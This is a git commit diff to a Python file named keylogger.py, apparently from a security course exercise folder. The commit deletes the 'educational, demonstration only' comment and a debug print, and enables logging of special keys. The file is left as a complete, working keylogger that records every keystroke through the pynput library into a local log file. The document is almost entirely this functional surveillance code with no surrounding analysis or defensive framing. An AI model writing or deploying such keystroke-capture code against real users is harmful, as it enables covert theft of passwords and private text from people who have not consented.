b5e2fe8fbb3d6192f1ca6320c1cd00bddf6e32f3
jvfdalmas <juaaaum@hotmail.com>
2025-04-01 09:36:29 +0200

    commit

--- Sicurezza2_10/Keylogger/keylogger.py
+++ Sicurezza2_10/Keylogger/keylogger.py
@@ -1,4 +1,3 @@
-# Educational Keylogger Example (for demonstration only)
 from pynput import keyboard
 
 LOG_FILE = "key_log.txt"
@@ -7,15 +6,12 @@ def on_press(key):
     try:
         # Append regular character keystrokes
         with open(LOG_FILE, "a") as f:
-            print(key)
             f.write(key.char)
     except AttributeError:
         # Handle special keys (e.g., space, enter)
-        # with open(LOG_FILE, "a") as f:
-        #    f.write("[" + str(key) + "]")
-        pass
+        with open(LOG_FILE, "a") as f:
+            f.write(f"[{key}]")  # Log special keys in brackets
 
 # Set up the key listener
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
-    
